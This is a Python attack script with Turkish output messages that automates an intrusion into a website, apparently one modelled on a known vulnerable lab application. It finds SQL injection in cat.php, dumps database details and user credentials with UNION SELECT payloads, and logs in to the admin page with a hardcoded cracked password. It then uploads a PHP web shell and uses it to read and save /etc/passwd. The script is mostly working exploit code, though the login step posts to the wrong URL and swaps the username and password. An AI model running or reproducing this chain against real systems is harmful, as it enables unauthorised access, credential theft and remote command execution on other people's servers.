import sys, requests, re
from bs4 import BeautifulSoup

print("""


█▀▀ █──█ █▀▀ █── █── 　 █▀▀▄ █──█ █▀▀▀ 　 █▀▀ █▀▀█ █── 
▀▀█ █▀▀█ █▀▀ █── █── 　 █▀▀▄ █──█ █─▀█ 　 ▀▀█ █──█ █── 
▀▀▀ ▀──▀ ▀▀▀ ▀▀▀ ▀▀▀ 　 ▀▀▀─ ─▀▀▀ ▀▀▀▀ 　 ▀▀▀ ▀▀▀█ ▀▀▀


by mars  

""")
#payloads
db_info = "database(),0x3a,version(),0x3a,user()"
db_creds = "login,0x3a,password"
web_shell = "<?php system($_GET['cmd']); ?>"
#

print ("Hedef URL Girin")
target = input('> http://')
target = "http://" + target if not target.startswith('http://') else target

print ("\n [ + ] SQL Açığı Aranıyor....")
payload = target + "/cat.php?id={id}{payload}".format(id=1, payload="\'")
vulnerable = re.search(r'error', requests.get(payload).text)
if not vulnerable:
    print("[ X ] Açık Bulunamadı.. :(")
    sys.exit(-1)
else:
    print("[ + ] hedefte açık bulundu !")



print ("\n [ + ] Veritabanı Bilgileri Hazırlanıyor..")

sqli = " UNION SELECT 1,concat({}),3,4".format(db_info)
payload = target + "/cat.php?id={id}{payload}".format(id=0, payload=sqli)
strings = BeautifulSoup(requests.get(payload).text, 'lxml').stripped_strings

for s in strings:
    if (re.search(r'^Picture: ', s)):
        infos = s.replace(' ', '').split(':')[1:]


        print("  [*] Veritabanı İsimi      : " + infos[0])
        print("  [*] Veritabanı Kullanıcı  : " + infos[1])
        print("  [*] Veritabanı Version    : " + infos[2])


# 

print("\n [ + ] Veritabanı Kimlik bilgileri Hazırlanıyor..")

sqli = " UNION SELECT 1,concat({}),3,4 FROM users".format(db_creds)
payload = target + "/cat.php?id={id}{payload}".format(id=0, payload=sqli)
strings = BeautifulSoup(requests.get(payload).text, 'lxml').stripped_strings

for s in strings:
    if (re.search(r'^Picture: ', s)):
        infos = s.replace(' ', '').split(':')[1:]

        print("  [*] kullanıcı adı    : " + infos[0])
        print("  [*] şifre            : " + infos[1])

#

        print ("\n [ + ] Admin Sayfasına Erişiliyor..")


        login = infos[1]
        password = "P4ssw0rd"
        print("  [*] Şifre         : " + login)
        print("  [*] Kırılan Şifre : " + password)

        payload = target + "/admin/login.php"
        request = requests.post(target, data = {
            'user':login,
            'password':password
        })

        if request.status_code == 200:
            print (" [*] Giriş Başarılı !")
        else: 
            print (" [*] Giriş Başarısız Oldu... Çıkış Yapılıyor.")
            sys.exit(-1)

        print("\n [ + ] Web Shell YÜkleniyor..")
        with open("web_shell.php3", 'w') as f:
                f.write(web_shell)

        payload = target + "/admin/index.php"
        request = requests.post(payload, data= {
            'title':'shell',
            'image':web_shell,
            'category':'1',
            'Add':'Add'

        })

        if request.status_code == 200:
            print (" [*] Yükleme Başarılı !")
        else:
            print(" [x] Yükleme Başarısız Oldu... Çıkış Yapılıyor.")
            sys.exit(-1)


print("\n [ + ] Her şey mÜKEMMEL :O")

payload = target + "/admin/uploads/web_shell.php3?cmd=cat /etc/passwd"
request = requests.get(payload)
print (" [*] Kaydediliyor /etc/passwd ve passwd_dump")
with open("passwd_dump", "w") as f:
    f.write(request.text)